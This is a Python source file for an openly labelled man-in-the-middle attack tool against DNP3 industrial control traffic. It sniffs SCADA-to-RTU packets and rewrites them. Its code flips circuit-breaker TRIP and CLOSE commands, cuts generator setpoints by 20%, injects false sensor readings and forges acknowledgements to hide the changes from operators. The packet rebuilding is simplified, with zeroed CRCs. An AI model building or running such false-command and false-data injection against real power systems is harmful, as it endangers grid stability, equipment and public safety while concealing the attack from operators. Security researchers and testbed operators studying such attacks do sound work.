"""
DNP3 Packet Filter for MiTM Attacks

Captures and manipulates DNP3 packets on port 20000.
Provides hooks for False Command Injection (FCI) and False Data Injection (FDI) attacks.
"""

import asyncio
import logging
import struct
import socket
from typing import Dict, List, Optional, Callable, Tuple, Any
from dataclasses import dataclass
from enum import Enum

# Try to import scapy for packet manipulation
try:
    from scapy.all import sniff, IP, TCP, Raw, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available. Using mock packet filtering.")

logger = logging.getLogger(__name__)

# DNP3 Constants
DNP3_START_BYTES = b'\x05\x64'
DNP3_PORT = 20000

class DNP3FunctionCode(Enum):
    """DNP3 Function Codes"""
    READ = 0x01
    WRITE = 0x02
    SELECT = 0x03
    OPERATE = 0x04
    DIRECT_OPERATE = 0x05
    DIRECT_OPERATE_NO_ACK = 0x06
    FREEZE = 0x07
    FREEZE_NO_ACK = 0x08
    FREEZE_CLEAR = 0x09
    FREEZE_CLEAR_NO_ACK = 0x0A
    FREEZE_AT_TIME = 0x0B
    COLD_RESTART = 0x0C
    WARM_RESTART = 0x0D
    INITIALIZE_DATA = 0x0E
    INITIALIZE_APPLICATION = 0x0F
    START_APPLICATION = 0x10
    STOP_APPLICATION = 0x11
    SAVE_CONFIGURATION = 0x12
    ENABLE_UNSOLICITED = 0x14
    DISABLE_UNSOLICITED = 0x15
    ASSIGN_CLASS = 0x16
    DELAY_MEASURE = 0x17
    RECORD_CURRENT_TIME = 0x18
    OPEN_FILE = 0x19
    CLOSE_FILE = 0x1A
    DELETE_FILE = 0x1B
    GET_FILE_INFO = 0x1C
    AUTHENTICATE = 0x1D
    ABORT = 0x1E
    RESPONSE = 0x81
    UNSOLICITED_RESPONSE = 0x82
    AUTHENTICATE_RESPONSE = 0x83

class DNP3ObjectGroup(Enum):
    """DNP3 Object Groups"""
    BINARY_INPUT = 0x01
    BINARY_OUTPUT = 0x0C
    ANALOG_INPUT = 0x1E
    ANALOG_OUTPUT = 0x29
    BINARY_COMMAND = 0x0C
    ANALOG_COMMAND = 0x29

@dataclass
class DNP3Packet:
    """Parsed DNP3 packet structure"""
    start: bytes
    length: int
    control: int
    destination: int
    source: int
    function_code: int
    data: bytes
    crc: bytes
    raw_packet: bytes
    is_response: bool = False

class PacketFilter:
    """
    DNP3 packet filter for intercepting and manipulating SCADA-RTU communication.
    """
    
    def __init__(self, dnp3_port: int = DNP3_PORT):
        """
        Initialize packet filter.
        
        Args:
            dnp3_port: DNP3 communication port (default 20000)
        """
        self.dnp3_port = dnp3_port
        self.is_filtering = False
        self.packet_count = 0
        self.modified_count = 0
        self.capture_task: Optional[asyncio.Task] = None
        
        # Packet modification hooks
        self.modification_hooks: Dict[str, Callable] = {
            'binary_operate': self.modify_binary_operate,
            'analog_operate': self.modify_analog_operate,
            'read_response': self.modify_read_response,
            'acknowledgement': self.modify_acknowledgement
        }
        
        # Attack configuration
        self.attack_enabled = False
        self.attack_scenarios: List[str] = []
        
        logger.info(f"Packet Filter initialized for DNP3 port {dnp3_port}")
    
    def parse_dnp3_packet(self, raw_data: bytes) -> Optional[DNP3Packet]:
        """
        Parse raw packet data into DNP3 structure.
        
        Args:
            raw_data: Raw packet bytes
            
        Returns:
            Parsed DNP3Packet or None if not valid DNP3
        """
        if len(raw_data) < 10:  # Minimum DNP3 header size
            return None
        
        # Check for DNP3 start bytes
        if raw_data[:2] != DNP3_START_BYTES:
            return None
        
        try:
            # Parse DNP3 header
            start = raw_data[:2]
            length = raw_data[2]
            control = raw_data[3]
            destination = struct.unpack('<H', raw_data[4:6])[0]
            source = struct.unpack('<H', raw_data[6:8])[0]
            
            # Skip CRC and get function code
            function_code = raw_data[10] if len(raw_data) > 10 else 0
            
            # Extract data payload (simplified)
            data_start = 11  # After header + CRC
            crc_end = len(raw_data)
            data = raw_data[data_start:crc_end-2] if crc_end > data_start + 2 else b''
            crc = raw_data[-2:] if len(raw_data) >= 2 else b''
            
            is_response = (function_code & 0x80) != 0
            
            return DNP3Packet(
                start=start,
                length=length,
                control=control,
                destination=destination,
                source=source,
                function_code=function_code,
                data=data,
                crc=crc,
                raw_packet=raw_data,
                is_response=is_response
            )
            
        except Exception as e:
            logger.debug(f"Failed to parse DNP3 packet: {e}")
            return None
    
    def modify_binary_operate(self, packet: DNP3Packet) -> Optional[bytes]:
        """
        Modify binary operate commands - flip TRIP ↔ CLOSE.
        
        Args:
            packet: Parsed DNP3 packet
            
        Returns:
            Modified packet bytes or None if no modification
        """
        if packet.function_code not in [DNP3FunctionCode.OPERATE.value, 
                                       DNP3FunctionCode.DIRECT_OPERATE.value]:
            return None
        
        # Look for binary command objects (Group 12)
        if len(packet.data) < 3:
            return None
        
        modified_data = bytearray(packet.data)
        modifications_made = False
        
        # Simple pattern matching for binary commands
        # In real DNP3, this would require proper object parsing
        for i in range(len(modified_data) - 1):
            # Look for binary command pattern (simplified)
            if modified_data[i] == 0x0C:  # Group 12 (Binary Command)
                if i + 1 < len(modified_data):
                    command_byte = modified_data[i + 1]
                    # Flip TRIP (0x41) ↔ CLOSE (0x81)
                    if command_byte == 0x41:  # TRIP command
                        modified_data[i + 1] = 0x81  # Change to CLOSE
                        modifications_made = True
                        logger.warning(f"🔥 ATTACK: Modified TRIP command to CLOSE for breaker")
                    elif command_byte == 0x81:  # CLOSE command
                        modified_data[i + 1] = 0x41  # Change to TRIP
                        modifications_made = True
                        logger.warning(f"🔥 ATTACK: Modified CLOSE command to TRIP for breaker")
        
        if modifications_made:
            # Rebuild packet with modified data
            return self._rebuild_packet(packet, bytes(modified_data))
        
        return None
    
    def modify_analog_operate(self, packet: DNP3Packet) -> Optional[bytes]:
        """
        Modify analog operate commands - lower generator setpoints.
        
        Args:
            packet: Parsed DNP3 packet
            
        Returns:
            Modified packet bytes or None if no modification
        """
        if packet.function_code not in [DNP3FunctionCode.OPERATE.value, 
                                       DNP3FunctionCode.DIRECT_OPERATE.value]:
            return None
        
        # Look for analog command objects (Group 41)
        if len(packet.data) < 6:
            return None
        
        modified_data = bytearray(packet.data)
        modifications_made = False
        
        # Pattern matching for analog commands
        for i in range(len(modified_data) - 5):
            if modified_data[i] == 0x29:  # Group 41 (Analog Command)
                # Extract 32-bit float value (simplified)
                try:
                    value_bytes = modified_data[i+2:i+6]
                    if len(value_bytes) == 4:
                        original_value = struct.unpack('<f', value_bytes)[0]
                        
                        # Reduce setpoint by 20% (attack scenario)
                        modified_value = original_value * 0.8
                        
                        # Pack modified value back
                        new_bytes = struct.pack('<f', modified_value)
                        modified_data[i+2:i+6] = new_bytes
                        
                        modifications_made = True
                        logger.warning(f"🔥 ATTACK: Modified analog setpoint: {original_value:.2f} -> {modified_value:.2f}")
                        
                except Exception as e:
                    logger.debug(f"Failed to modify analog value: {e}")
        
        if modifications_made:
            return self._rebuild_packet(packet, bytes(modified_data))
        
        return None
    
    def modify_read_response(self, packet: DNP3Packet) -> Optional[bytes]:
        """
        Modify read response data - inject false measurement values.
        
        Args:
            packet: Parsed DNP3 packet
            
        Returns:
            Modified packet bytes or None if no modification
        """
        if not packet.is_response:
            return None
        
        # Look for measurement data in response
        if len(packet.data) < 4:
            return None
        
        modified_data = bytearray(packet.data)
        modifications_made = False
        
        # Pattern matching for analog input objects (Group 30)
        for i in range(len(modified_data) - 5):
            if modified_data[i] == 0x1E:  # Group 30 (Analog Input)
                try:
                    # Extract measurement value
                    value_bytes = modified_data[i+2:i+6]
                    if len(value_bytes) == 4:
                        original_value = struct.unpack('<f', value_bytes)[0]
                        
                        # Inject false reading (add random variation)
                        import random
                        false_value = original_value + random.uniform(-5.0, 5.0)
                        
                        # Pack false value
                        new_bytes = struct.pack('<f', false_value)
                        modified_data[i+2:i+6] = new_bytes
                        
                        modifications_made = True
                        logger.warning(f"🔥 ATTACK: Injected false measurement: {original_value:.2f} -> {false_value:.2f}")
                        
                except Exception as e:
                    logger.debug(f"Failed to modify measurement: {e}")
        
        if modifications_made:
            return self._rebuild_packet(packet, bytes(modified_data))
        
        return None
    
    def modify_acknowledgement(self, packet: DNP3Packet) -> Optional[bytes]:
        """
        Forge acknowledgement responses to hide attack traces.
        
        Args:
            packet: Parsed DNP3 packet
            
        Returns:
            Modified packet bytes or None if no modification
        """
        if not packet.is_response:
            return None
        
        # Create fake ACK if needed to hide manipulation
        if packet.function_code == DNP3FunctionCode.RESPONSE.value:
            # Modify response to indicate success even if command was altered
            modified_data = bytearray(packet.data)
            
            # Set success status (simplified)
            if len(modified_data) > 0:
                modified_data[0] = 0x00  # Success status
                logger.warning("🔥 ATTACK: Forged ACK to hide command manipulation")
                return self._rebuild_packet(packet, bytes(modified_data))
        
        return None
    
    def _rebuild_packet(self, original: DNP3Packet, new_data: bytes) -> bytes:
        """
        Rebuild DNP3 packet with modified data and updated CRC.
        
        Args:
            original: Original packet structure
            new_data: Modified data payload
            
        Returns:
            Complete modified packet bytes
        """
        # Simplified packet reconstruction
        # In production, this would need proper CRC calculation
        
        header = bytearray()
        header.extend(original.start)  # Start bytes
        header.append(len(new_data) + 5)  # New length
        header.append(original.control)
        header.extend(struct.pack('<H', original.destination))
        header.extend(struct.pack('<H', original.source))
        header.extend(b'\x00\x00')  # Header CRC (simplified)
        header.append(original.function_code)
        
        # Combine header + new data + CRC
        packet = header + new_data
        packet.extend(b'\x00\x00')  # Data CRC (simplified)
        
        return bytes(packet)
    
    async def start_filtering(self, target_ips: List[str]):
        """
        Start packet filtering for specified target IPs.
        
        Args:
            target_ips: List of IP addresses to monitor
        """
        if self.is_filtering:
            logger.warning("Packet filtering already active")
            return
        
        self.is_filtering = True
        self.target_ips = target_ips
        
        logger.info(f"Starting packet filtering for targets: {target_ips}")
        
        # Start capture task
        self.capture_task = asyncio.create_task(self._capture_loop())
        
        logger.info("Packet filtering started successfully")
    
    async def stop_filtering(self):
        """Stop packet filtering."""
        if not self.is_filtering:
            logger.warning("Packet filtering is not active")
            return
        
        self.is_filtering = False
        
        if self.capture_task:
            self.capture_task.cancel()
            try:
                await self.capture_task
            except asyncio.CancelledError:
                pass
        
        logger.info(f"Packet filtering stopped. Stats: {self.packet_count} captured, {self.modified_count} modified")
    
    async def _capture_loop(self):
        """Main packet capture loop."""
        try:
            if SCAPY_AVAILABLE:
                await self._scapy_capture()
            else:
                await self._mock_capture()
        except asyncio.CancelledError:
            logger.info("Packet capture loop cancelled")
            raise
        except Exception as e:
            logger.error(f"Error in packet capture loop: {e}")
    
    async def _scapy_capture(self):
        """Capture packets using Scapy."""
        def packet_handler(packet):
            if not self.is_filtering:
                return
            
            try:
                # Check if it's TCP traffic on DNP3 port
                if packet.haslayer(TCP) and packet.haslayer(Raw):
                    tcp_layer = packet[TCP]
                    if tcp_layer.dport == self.dnp3_port or tcp_layer.sport == self.dnp3_port:
                        self._process_packet(packet)
            except Exception as e:
                logger.debug(f"Error processing packet: {e}")
        
        # Start sniffing in a separate thread
        import threading
        
        def sniff_thread():
            sniff(filter=f"tcp port {self.dnp3_port}", prn=packet_handler, stop_filter=lambda x: not self.is_filtering)
        
        thread = threading.Thread(target=sniff_thread, daemon=True)
        thread.start()
        
        # Wait while filtering is active
        while self.is_filtering:
            await asyncio.sleep(1)
    
    async def _mock_capture(self):
        """Mock packet capture for testing."""
        logger.info("Using mock packet capture (Scapy not available)")
        
        while self.is_filtering:
            # Simulate capturing packets
            self.packet_count += 1
            
            if self.packet_count % 10 == 0:
                logger.debug(f"Mock capture: {self.packet_count} packets processed")
            
            await asyncio.sleep(1)
    
    def _process_packet(self, packet):
        """Process captured packet and apply modifications if needed."""
        self.packet_count += 1
        
        try:
            # Extract raw DNP3 data
            if packet.haslayer(Raw):
                raw_data = bytes(packet[Raw].load)
                
                # Parse DNP3 packet
                dnp3_packet = self.parse_dnp3_packet(raw_data)
                if not dnp3_packet:
                    return
                
                logger.debug(f"Captured DNP3 packet: FC={dnp3_packet.function_code:02x}, Len={len(raw_data)}")
                
                # Apply attack modifications
                modified_packet = None
                
                if self.attack_enabled:
                    # Try different modification hooks
                    for scenario in self.attack_scenarios:
                        if scenario in self.modification_hooks:
                            modified_packet = self.modification_hooks[scenario](dnp3_packet)
                            if modified_packet:
                                break
                
                # Forward packet (modified or original)
                if modified_packet:
                    self._forward_packet(packet, modified_packet)
                    self.modified_count += 1
                else:
                    self._forward_packet(packet, raw_data)
                
        except Exception as e:
            logger.error(f"Error processing packet: {e}")
    
    def _forward_packet(self, original_packet, data: bytes):
        """Forward packet to its destination."""
        if SCAPY_AVAILABLE:
            try:
                # Reconstruct and send packet
                ip_layer = original_packet[IP]
                tcp_layer = original_packet[TCP]
                
                # Create new packet with modified data
                new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                            TCP(sport=tcp_layer.sport, dport=tcp_layer.dport, 
                                seq=tcp_layer.seq, ack=tcp_layer.ack, 
                                flags=tcp_layer.flags) / Raw(load=data)
                
                send(new_packet, verbose=False)
                
            except Exception as e:
                logger.error(f"Failed to forward packet: {e}")
        else:
            logger.debug(f"MOCK FORWARD: {len(data)} bytes")
    
    def enable_attack(self, scenarios: List[str]):
        """Enable attack mode with specified scenarios."""
        self.attack_enabled = True
        self.attack_scenarios = scenarios
        logger.warning(f"🔥 ATTACK MODE ENABLED: {scenarios}")
    
    def disable_attack(self):
        """Disable attack mode."""
        self.attack_enabled = False
        self.attack_scenarios = []
        logger.info("Attack mode disabled")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get packet filtering statistics."""
        return {
            'is_filtering': self.is_filtering,
            'packets_captured': self.packet_count,
            'packets_modified': self.modified_count,
            'attack_enabled': self.attack_enabled,
            'attack_scenarios': self.attack_scenarios,
            'modification_rate': self.modified_count / max(self.packet_count, 1) * 100,
            'scapy_available': SCAPY_AVAILABLE
        }

# Test function
async def test_packet_filter():
    """Test the packet filtering functionality."""
    filter = PacketFilter()
    
    print("Testing packet filter...")
    filter.enable_attack(['binary_operate', 'analog_operate'])
    
    await filter.start_filtering(['192.168.1.100', '192.168.1.10'])
    
    # Run for 10 seconds
    await asyncio.sleep(10)
    
    await filter.stop_filtering()
    
    stats = filter.get_statistics()
    print(f"Packet filter test completed: {stats}")

if __name__ == "__main__":
    asyncio.run(test_packet_filter())
